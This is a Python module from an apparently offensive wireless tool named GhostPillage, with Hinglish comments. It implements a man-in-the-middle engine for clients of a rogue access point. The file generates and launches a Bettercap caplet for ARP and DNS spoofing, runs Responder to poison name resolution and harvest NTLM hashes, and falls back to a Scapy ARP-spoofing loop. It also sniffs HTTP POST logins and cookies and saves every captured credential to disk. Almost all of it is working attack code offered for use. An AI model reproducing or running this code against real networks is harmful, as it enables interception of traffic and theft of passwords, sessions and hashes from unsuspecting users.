#!/usr/bin/env python3
"""
pillage/mitm.py — Man-in-the-Middle Traffic Interception Engine

Yeh file rogue AP se connected clients ke traffic ko intercept karti hai.
Jab clients GhostAP se connect hote hain, unka saara traffic humare
through pass hota hai — hum intercept kar sakte hain:

- HTTP requests (passwords, session cookies, form data)
- DNS queries (redirect to phishing pages)
- SMB/NTLM authentication (capture hashes)
- Email credentials (POP3, IMAP, SMTP)
- FTP credentials
- Unencrypted traffic

Tools used:
- Bettercap (advanced MITM framework) — preferred
- Responder (NTLM hash capture) — fallback
- Python scapy (manual ARP spoofing) — last resort
"""

import os
import sys
import time
import json
import threading
import subprocess
from datetime import datetime

# Local imports
from utils.helpers import log, run_command, file_exists, check_root


class MITMEngine:
    """
    Man-in-the-Middle traffic interception engine.
    
    Features:
    - ARP spoofing (router impersonation)
    - DNS spoofing (domain redirection)
    - HTTP traffic capture
    - NTLM challenge capture (via Responder)
    - SSL stripping (HTTPS downgrade)
    - Session hijacking (cookie capture)
    """
    
    def __init__(self, interface, config_dir="/tmp/ghostpillage", verbose=False):
        """
        Initialize MITM engine.
        
        Args:
            interface (str): Network interface (e.g., wlan0)
            config_dir (str): Directory for logs and captures
            verbose (bool): Verbose logging
        """
        self.interface = interface
        self.config_dir = config_dir
        self.verbose = verbose
        self.log_file = os.path.join(config_dir, "pillage.log")
        
        # Create capture directories
        self.capture_dir = os.path.join(config_dir, "captures")
        self.http_dir = os.path.join(self.capture_dir, "http")
        self.creds_dir = os.path.join(self.capture_dir, "credentials")
        os.makedirs(self.http_dir, exist_ok=True)
        os.makedirs(self.creds_dir, exist_ok=True)
        
        # State
        self.is_running = False
        self.mitm_thread = None
        self.bettercap_process = None
        self.responder_process = None
        self.captured_creds = []
        
        log(self.log_file, "[+] MITMEngine initialized", verbose)
    
    
    def start_interception(self, mode="auto", target_ip=None, gateway_ip=None):
        """
        Start traffic interception.
        
        Step-by-step:
        1. Detect network configuration (IP, gateway)
        2. Choose MITM method (Bettercap > Responder > Scapy)
        3. Start interception in background
        4. Monitor for credential capture
        
        Args:
            mode (str): "auto" (detect best), "bettercap", "responder", "scapy"
            target_ip (str): Specific target IP (optional, None = all)
            gateway_ip (str): Gateway/router IP (optional, auto-detect)
        
        Returns:
            bool: True if interception started
        """
        log(self.log_file, f"[*] Starting traffic interception (mode: {mode})", self.verbose)
        print(f"\n{'='*60}")
        print(f"  [PHASE 3] Client Pillage — Traffic Interception")
        print(f"{'='*60}")
        
        # Step 1: Detect network
        network_info = self._detect_network()
        if not network_info:
            print("[!] Could not detect network configuration")
            return False
        
        ip = network_info["ip"]
        gateway = network_info["gateway"]
        netmask = network_info["netmask"]
        
        print(f"\n[+] Network detected:")
        print(f"    Interface IP: {ip}")
        print(f"    Gateway: {gateway}")
        print(f"    Netmask: {netmask}")
        
        # Step 2: Start based on mode
        try:
            if mode == "auto" or mode == "bettercap":
                success = self._start_bettercap(ip, gateway)
                if success:
                    print(f"    [+] Bettercap interception active")
                    return True
            
            if mode == "auto" or mode == "responder":
                success = self._start_responder()
                if success:
                    print(f"    [+] Responder active (NTLM capture)")
                    return True
            
            if mode == "scapy":
                success = self._start_scapy_arp_spoof(ip, gateway)
                if success:
                    print(f"    [+] Scapy ARP spoofing active")
                    return True
            
            print("[!] All MITM methods failed")
            return False
            
        except Exception as e:
            log(self.log_file, f"[!] MITM error: {e}", self.verbose)
            print(f"[!] Error: {e}")
            return False
    
    
    def _detect_network(self):
        """
        Detect current network configuration.
        
        Uses:
        - `ip addr show` for IP/mask
        - `ip route` for gateway
        
        Returns:
            dict: Network info or None
        """
        # Get IP address
        cmd = f"ip addr show {self.interface} 2>/dev/null | grep 'inet ' | awk '{{print $2}}'"
        result = run_command(cmd, timeout=5, verbose=False)
        
        if not result["success"] or not result["stdout"].strip():
            log(self.log_file, "[!] Could not detect IP on interface", self.verbose)
            return None
        
        ip_cidr = result["stdout"].strip().split("\n")[0]
        ip_parts = ip_cidr.split("/")
        ip = ip_parts[0]
        netmask_cidr = ip_parts[1] if len(ip_parts) > 1 else "24"
        
        # Get gateway
        cmd2 = f"ip route 2>/dev/null | grep default | awk '{{print $3}}'"
        result2 = run_command(cmd2, timeout=5, verbose=False)
        gateway = result2["stdout"].strip().split("\n")[0] if result2["stdout"].strip() else "192.168.1.1"
        
        return {
            "ip": ip,
            "gateway": gateway,
            "netmask": netmask_cidr,
            "interface": self.interface
        }
    
    
    def _start_bettercap(self, local_ip, gateway_ip):
        """
        Start Bettercap for advanced MITM.
        
        Bettercap features:
        - ARP spoofing
        - DNS spoofing
        - HTTP/HTTPS proxy
        - Credential sniffer
        - Session hijacking
        
        Args:
            local_ip (str): Our IP address
            gateway_ip (str): Gateway IP to spoof
        
        Returns:
            bool: True if started
        """
        log(self.log_file, "[*] Starting Bettercap...", self.verbose)
        print("    [*] Starting Bettercap MITM framework...")
        
        # Check if bettercap is installed
        if not self._check_tool("bettercap"):
            print("    [!] Bettercap not found. Trying alternative method...")
            return False
        
        # Create Bettercap caplet script
        caplet_file = os.path.join(self.config_dir, "ghostpillage.cap")
        
        caplet_script = f"""
# GhostPillage Bettercap Caplet
# Auto-generated MITM script

# Set interface
set arp.spoof.targets {gateway_ip}
set arp.spoof.internal true
set arp.spoof.fullduplex true

# Enable modules
arp.spoof on
net.sniff on
net.sniff.verbose true
net.sniff.local true

# HTTP proxy for credential capture
set http.proxy.port 8080
http.proxy on

# DNS spoofing (capture all DNS queries)
set dns.spoof.all true
dns.spoof on

# Log everything
set events.stream.output {self.capture_dir}/bettercap_events.log
events.stream on
"""
        
        with open(caplet_file, "w") as f:
            f.write(caplet_script)
        
        # Start Bettercap in background
        log_file = os.path.join(self.capture_dir, "bettercap_output.log")
        
        try:
            self.bettercap_process = subprocess.Popen(
                [
                    "bettercap", "-iface", self.interface,
                    "-caplet", caplet_file,
                    "-eval", f"set arp.spoof.targets {gateway_ip}"
                ],
                stdout=open(log_file, "w"),
                stderr=subprocess.STDOUT,
                preexec_fn=os.setpgrp  # Run in separate process group
            )
            
            # Give it time to start
            time.sleep(2)
            
            if self.bettercap_process.poll() is None:
                log(self.log_file, f"[+] Bettercap started (PID: {self.bettercap_process.pid})", self.verbose)
                print(f"    [+] Bettercap active (PID: {self.bettercap_process.pid})")
                self.is_running = True
                return True
            else:
                log(self.log_file, "[!] Bettercap exited immediately", self.verbose)
                print("    [!] Bettercap failed to start")
                return False
                
        except Exception as e:
            log(self.log_file, f"[!] Bettercap start error: {e}", self.verbose)
            return False
    
    
    def _start_responder(self):
        """
        Start Responder for NTLM hash capture.
        
        Responder captures:
        - NTLMv1/v2 hashes (from SMB, HTTP, LDAP, etc.)
        - NetBIOS name service poisoning
        - LLMNR/mDNS poisoning
        
        Returns:
            bool: True if started
        """
        log(self.log_file, "[*] Starting Responder...", self.verbose)
        print("    [*] Starting Responder (NTLM hash capture)...")
        
        if not self._check_tool("responder"):
            print("    [!] Responder not found")
            return False
        
        # Responder config — enable all poisoning
        responder_conf = "/etc/responder/Responder.conf"
        if file_exists(responder_conf):
            # Backup original
            backup = responder_conf + ".backup"
            if not file_exists(backup):
                import shutil
                shutil.copy(responder_conf, backup)
        
        # Start Responder in background
        log_file = os.path.join(self.capture_dir, "responder_output.log")
        
        try:
            self.responder_process = subprocess.Popen(
                [
                    "responder", "-I", self.interface,
                    "-w",  # WPAD proxy
                    "-r",  # Enable answers for netbios wredir suffix queries
                    "-f",  # Enable answers for netbios domain suffix queries
                    "-v",  # Verbose
                    "-F",  # Fingerprint
                ],
                stdout=open(log_file, "w"),
                stderr=subprocess.STDOUT,
                preexec_fn=os.setpgrp
            )
            
            time.sleep(2)
            
            if self.responder_process.poll() is None:
                log(self.log_file, f"[+] Responder started (PID: {self.responder_process.pid})", self.verbose)
                print(f"    [+] Responder active (PID: {self.responder_process.pid})")
                self.is_running = True
                
                # Start monitoring Responder logs for hashes
                self._monitor_responder_logs()
                return True
            else:
                print("    [!] Responder failed to start")
                return False
                
        except Exception as e:
            log(self.log_file, f"[!] Responder error: {e}", self.verbose)
            return False
    
    
    def _start_scapy_arp_spoof(self, local_ip, gateway_ip):
        """
        Manual ARP spoofing using Scapy (fallback method).
        
        Bettercap ya Responder nahi hain toh basic ARP spoofing
        se kaam chalao.
        
        Args:
            local_ip (str): Our IP
            gateway_ip (str): Gateway IP to impersonate
        
        Returns:
            bool: True if started
        """
        log(self.log_file, "[*] Starting Scapy ARP spoofing...", self.verbose)
        print("    [*] Starting Scapy-based ARP spoofing...")
        
        try:
            from scapy.all import ARP, Ether, sendp, conf
            
            # Enable IP forwarding
            run_command("sysctl -w net.ipv4.ip_forward=1", timeout=3, verbose=False)
            
            # Get our MAC
            cmd = f"cat /sys/class/net/{self.interface}/address"
            result = run_command(cmd, timeout=3, verbose=False)
            our_mac = result["stdout"].strip().upper() if result["success"] else "00:00:00:00:00:00"
            
            # ARP spoofing loop in background thread
            def arp_spoof_loop():
                while self.is_running:
                    try:
                        # Tell gateway we are the target (actually, tell gateway our IP is gateway's IP)
                        # This is a simplified version
                        packet = ARP(
                            op=2,  # is-at (response)
                            pdst=gateway_ip,
                            hwdst="ff:ff:ff:ff:ff:ff",
                            psrc=local_ip
                        )
                        sendp(
                            Ether(dst="ff:ff:ff:ff:ff:ff") / packet,
                            iface=self.interface,
                            verbose=False
                        )
                        time.sleep(2)
                    except:
                        break
            
            self.is_running = True
            self.mitm_thread = threading.Thread(target=arp_spoof_loop, daemon=True)
            self.mitm_thread.start()
            
            log(self.log_file, "[+] Scapy ARP spoofing started", self.verbose)
            print("    [+] ARP spoofing active (basic mode)")
            return True
            
        except ImportError:
            log(self.log_file, "[!] Scapy not installed", self.verbose)
            print("    [!] Scapy not installed. Try: pip install scapy")
            return False
        except Exception as e:
            log(self.log_file, f"[!] Scapy error: {e}", self.verbose)
            return False
    
    
    def _monitor_responder_logs(self):
        """
        Monitor Responder log files for captured hashes.
        
        Responder saves captured NTLM hashes to:
        /usr/share/responder/logs/
        
        Yeh function background mein log files monitor karta hai
        aur naye hashes detect karta hai.
        """
        responder_log_dir = "/usr/share/responder/logs"
        
        def monitor():
            seen_hashes = set()
            
            while self.is_running:
                try:
                    if file_exists(responder_log_dir):
                        # Check for new hash files
                        for f in os.listdir(responder_log_dir):
                            if f.endswith(".txt"):
                                fpath = os.path.join(responder_log_dir, f)
                                content = open(fpath).read()
                                
                                # Extract NTLM hashes
                                for line in content.split("\n"):
                                    if "NTLM" in line or ":::" in line:
                                        if line not in seen_hashes:
                                            seen_hashes.add(line)
                                            self.captured_creds.append({
                                                "type": "NTLM",
                                                "hash": line,
                                                "source": f,
                                                "timestamp": datetime.now().isoformat()
                                            })
                                            
                                            # Save to our capture directory
                                            hash_file = os.path.join(
                                                self.creds_dir, 
                                                f"ntlm_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                                            )
                                            with open(hash_file, "w") as hf:
                                                hf.write(line + "\n")
                                            
                                            log(self.log_file, f"[+] NTLM hash captured: {line[:50]}...", True)
                                            print(f"\n[!] NTLM hash captured!")
                                            print(f"    Hash: {line[:60]}...")
                                            print(f"    Saved: {hash_file}")
                    
                    time.sleep(5)
                    
                except Exception as e:
                    time.sleep(10)
        
        monitor_thread = threading.Thread(target=monitor, daemon=True)
        monitor_thread.start()
        log(self.log_file, "[+] Responder log monitor started", self.verbose)
    
    
    def start_http_sniffer(self, port=8080):
        """
        Start HTTP proxy for credential sniffing.
        
        Captures:
        - POST form data (login forms)
        - HTTP Basic Auth
        - Session cookies
        - Request/response headers
        
        Args:
            port (int): Proxy port (default: 8080)
        
        Returns:
            bool: True if started
        """
        log(self.log_file, f"[*] Starting HTTP sniffer on port {port}", self.verbose)
        print(f"    [*] Starting HTTP credential sniffer (port {port})...")
        
        # Simple TCP dump of HTTP traffic on the interface
        # This captures unencrypted HTTP data
        
        def http_sniff_loop():
            try:
                from scapy.all import sniff, TCP, Raw
                
                def process_packet(packet):
                    if packet.haslayer(TCP) and packet.haslayer(Raw):
                        try:
                            payload = packet[Raw].load.decode('utf-8', errors='ignore')
                            
                            # Check for HTTP POST with credentials
                            if "POST" in payload and ("login" in payload.lower() or "password" in payload.lower()):
                                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                                cap_file = os.path.join(self.http_dir, f"http_post_{timestamp}.txt")
                                
                                with open(cap_file, "w") as f:
                                    f.write(f"Source: {packet[IP].src}:{packet[TCP].sport}\n")
                                    f.write(f"Destination: {packet[IP].dst}:{packet[TCP].dport}\n")
                                    f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                                    f.write(f"{'='*40}\n")
                                    f.write(payload)
                                
                                log(self.log_file, f"[+] HTTP POST captured from {packet[IP].src}", True)
                                print(f"\n[!] HTTP credentials captured from {packet[IP].src}")
                                print(f"    Saved: {cap_file}")
                                
                                # Try to extract username/password
                                if "username=" in payload or "user=" in payload or "email=" in payload:
                                    print(f"    [+] Potential credentials in payload")
                                
                        except:
                            pass
                
                sniff(iface=self.interface, prn=process_packet, store=False)
                
            except ImportError:
                log(self.log_file, "[!] Scapy not available for HTTP sniffing", self.verbose)
            except Exception as e:
                log(self.log_file, f"[!] HTTP sniffer error: {e}", self.verbose)
        
        http_thread = threading.Thread(target=http_sniff_loop, daemon=True)
        http_thread.start()
        
        log(self.log_file, "[+] HTTP sniffer started", self.verbose)
        print(f"    [+] HTTP sniffer active (listening on port {port})")
        
        return True
    
    
    def stop_interception(self):
        """
        Stop all interception processes.
        
        Kills Bettercap, Responder, and background threads.
        """
        log(self.log_file, "[*] Stopping interception...", self.verbose)
        print("\n[*] Stopping traffic interception...")
        
        # Stop Bettercap
        if self.bettercap_process:
            try:
                # Kill process group (including children)
                os.killpg(os.getpgid(self.bettercap_process.pid), 15)
                self.bettercap_process.wait(timeout=3)
                print("    [+] Bettercap stopped")
            except:
                self.bettercap_process.kill()
        
        # Stop Responder
        if self.responder_process:
            try:
                os.killpg(os.getpgid(self.responder_process.pid), 15)
                self.responder_process.wait(timeout=3)
                print("    [+] Responder stopped")
            except:
                self.responder_process.kill()
        
        # Stop threads
        self.is_running = False
        
        # Disable IP forwarding
        run_command("sysctl -w net.ipv4.ip_forward=0", timeout=3, verbose=False)
        
        # Summary
        print(f"\n[+] Interception stopped")
        print(f"    Credentials captured: {len(self.captured_creds)}")
        print(f"    HTTP captures: {len(os.listdir(self.http_dir)) if os.path.exists(self.http_dir) else 0}")
        
        log(self.log_file, f"[+] Interception stopped. Creds: {len(self.captured_creds)}", self.verbose)
    
    
    def get_captured_credentials(self):
        """
        Get list of all captured credentials.
        
        Returns:
            list: Credential entries
        """
        return self.captured_creds
    
    
    def save_capture_summary(self):
        """
        Save summary of all captures to JSON file.
        
        Returns:
            str: Path to summary file
        """
        summary = {
            "timestamp": datetime.now().isoformat(),
            "interface": self.interface,
            "total_credentials": len(self.captured_creds),
            "http_captures": len(os.listdir(self.http_dir)) if os.path.exists(self.http_dir) else 0,
            "credentials": self.captured_creds,
            "capture_directories": {
                "http": self.http_dir,
                "credentials": self.creds_dir,
                "full_captures": self.capture_dir
            }
        }
        
        summary_file = os.path.join(self.config_dir, "capture_summary.json")
        with open(summary_file, "w") as f:
            json.dump(summary, f, indent=2)
        
        log(self.log_file, f"[+] Capture summary saved: {summary_file}", self.verbose)
        return summary_file
    
    
    def _check_tool(self, tool_name):
        """
        Check if a system tool is installed.
        
        Args:
            tool_name (str): Tool name
        
        Returns:
            bool: True if installed
        """
        result = run_command(f"which {tool_name}", timeout=3, verbose=False)
        return result["success"]


# Agar directly run kiya jaaye
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 mitm.py <interface> [mode]")
        print("Modes: auto, bettercap, responder, scapy")
        print("Example: python3 mitm.py wlan0 auto")
        sys.exit(1)
    
    iface = sys.argv[1]
    mode = sys.argv[2] if len(sys.argv) > 2 else "auto"
    
    if not check_root():
        print("[!] Root required")
        sys.exit(1)
    
    mitm = MITMEngine(iface, "/tmp/ghostpillage", verbose=True)
    
    try:
        mitm.start_interception(mode=mode)
        
        # Also start HTTP sniffer
        mitm.start_http_sniffer()
        
        print("\n[MITM] Running. Press Enter to stop and view summary...")
        input()
        
    except KeyboardInterrupt:
        pass
    finally:
        mitm.stop_interception()
        summary = mitm.save_capture_summary()
        print(f"\n[MITM] Summary saved: {summary}")